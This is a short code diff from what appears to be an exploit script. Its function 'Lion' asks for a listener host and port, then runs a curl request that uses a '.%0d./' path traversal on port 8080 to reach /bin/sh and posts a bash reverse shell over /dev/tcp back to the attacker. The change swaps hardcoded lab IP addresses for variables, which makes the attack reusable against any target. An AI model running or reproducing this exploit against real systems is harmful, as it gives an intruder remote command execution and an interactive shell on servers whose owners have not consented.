@@ -116,7 +116,7 @@ def Lion():
     global ip, sess
     LHOST = input("[*] Enter LHOST: ")
     LPORT = input("[*] Enter Listening Port: ")
-    command = f"""curl -s -X POST 'http://10.10.75.132:8080/.%0d./.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "sleep 2;/bin/bash -i >& /dev/tcp/10.8.71.139/1337 0>&1"'"""
+    command = f"""curl -s -X POST 'http://{ip}:8080/.%0d./.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"'"""
     os.system(command)
     print(command)
 
